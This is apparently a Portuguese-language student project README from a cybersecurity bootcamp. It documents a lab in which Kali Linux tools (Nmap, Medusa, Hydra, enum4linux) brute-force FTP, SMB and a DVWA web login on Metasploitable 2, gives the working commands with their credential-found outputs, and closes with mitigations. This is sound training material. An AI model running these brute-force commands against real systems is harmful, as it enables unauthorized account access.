# Dio – Santander – Cibersegurança 2025  
## Protocolos de Autenticação & Brute Force  

**Instrutora:** Isadora Ferrão  

---

## 🎯 Objetivo  

Implementar e documentar um projeto prático utilizando **Kali Linux** e a ferramenta **Medusa**, em conjunto com os ambientes vulneráveis **Metasploitable 2** e **DVWA**, simulando ataques de **força bruta** e explorando medidas de **prevenção e mitigação**.  

---

## 🧩 Configuração do Ambiente  

- **Duas VMs** no VirtualBox:
  - **Kali Linux:** máquina atacante.  
  - **Metasploitable 2:** máquina alvo.  
- **Rede:** Host-only (interna).  
- **Login padrão do Metasploitable 2:**  
  ```
  msfadmin : msfadmin
  ```

---

## ⚙️ Ferramentas Utilizadas  

| Ferramenta | Função Principal |
|-------------|------------------|
| **Nmap** | Varredura e identificação de serviços e versões. |
| **Medusa** | Ataques de força bruta em serviços de rede. |
| **Hydra** | Ataques de brute force via HTTP e outros protocolos. |
| **Enum4linux** | Enumeração de usuários e recursos SMB. |
| **John the Ripper** | Quebra de senhas a partir de hashes. |
| **WPScan** | Auditoria de sites WordPress. |
| **Ncrack** | Brute force em autenticações de rede. |

---

## 🔐 Protocolos de Autenticação  

- **HTTP Basic / Digest:** simples, usado em web (inseguro sem HTTPS).  
- **Form-based:** formulários HTML.  
- **NTLM / SMB:** autenticação de compartilhamento de arquivos.  
- **Kerberos:** usado em ambientes Active Directory.  
- **LDAP / AD Bind:** autenticação em diretórios.  
- **SSH:** autenticação por senha ou chave pública.  
- **RDP:** acesso remoto com suporte a NLA/Kerberos.  
- **OAuth / OpenID Connect:** autenticação moderna para web e APIs.  

---

## 🧠 Tipos de Ataques de Força Bruta  

- **Online brute-force:** tentativa direta contra o serviço.  
- **Offline brute-force:** quebra de hashes localmente.  
- **Credential stuffing:** uso de combos vazados (e-mail:senha).  
- **Password spraying:** testar poucas senhas em vários usuários.  
- **Dictionary attack:** uso de wordlists e mutações de palavras.  

---

## 🧪 Etapas Práticas  

### 1️⃣ Varredura de Rede com Nmap  

```bash
nmap -sV -p 21,22,80,139,445 192.168.56.103
```

**Resultado:**  
- FTP (vsftpd 2.3.4) — vulnerável.  
- SSH (OpenSSH 4.7p1) — versão antiga.  
- HTTP (Apache 2.2.8) — desatualizado.  
- SMB (Samba 3.x–4.x) — com workgroup padrão “WORKGROUP”.

---

### 2️⃣ Ataque FTP com Medusa  

**Preparação:**
```bash
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
```

**Ataque:**
```bash
medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6 -f
```

**Resultado:**
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]
```

---

### 3️⃣ Ataque a Formulário Web (DVWA) com Hydra  

```bash
hydra -L users.txt -P pass.txt 192.168.56.103 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -t 6
```

**Resultado:**
```
[80][http-post-form] host: 192.168.56.103 login: admin password: password
```

*(O módulo `http-m` do Medusa apresentou erro, por isso foi utilizado o Hydra.)*

---

### 4️⃣ Ataque SMB (Password Spraying)  

**Enumeração de usuários:**
```bash
enum4linux -a 192.168.56.103 | tee enum_output.txt
```

**Criação de listas:**
```bash
echo -e 'user\nmsfadmin\nservice' > smb_users.txt
echo -e 'password\n123456\nWelcome\nmsfadmin' > senhas_spray.txt
```

**Ataque:**
```bash
medusa -h 192.168.56.103 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2
```

**Resultado:**
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]
```

**Validação do acesso:**
```bash
smbclient -L //192.168.56.103 -U msfadmin
```

---

## 🧱 Mitigações Recomendadas  

### 🔒 Autenticação e Senhas  
- Usar **MFA/2FA** em contas críticas.  
- Exigir **senhas fortes e únicas** (mínimo 12 caracteres).  
- Implementar **expiração periódica** e bloqueio após falhas.  
- Preferir **chaves SSH** em vez de senhas.  

### 🚫 Controle e Bloqueio  
- Aplicar **rate limiting** e bloqueio de IPs suspeitos.  
- Definir **limite de tentativas por conta/IP**.  

### 📈 Monitoramento  
- Coletar e analisar **logs de autenticação**.  
- Configurar **alertas em tempo real**.  
- Realizar **auditorias regulares** e **pentests autorizados**.  

### 🧩 Hardening e Rede  
- Atualizar serviços vulneráveis (ex.: vsftpd, Samba, Apache).  
- Substituir **FTP por SFTP/FTPS**.  
- Desativar **SMBv1** e ativar **SMB signing/encryption**.  
- Segmentar redes e restringir acessos administrativos.  
- Exigir **TLS/HTTPS** em todos os logins.  

---

## 🧭 Conclusão  

A segurança não depende apenas de firewalls ou antivírus.  
Falhas humanas e negligência organizacional continuam sendo vetores críticos de vulnerabilidade.  
A conscientização, o uso ético de ferramentas e a prática constante são os pilares da **cibersegurança moderna**.  

---

📘 **Autor:** Roberto Yasuhiko Takushi  
📅 **Ano:** 2025  
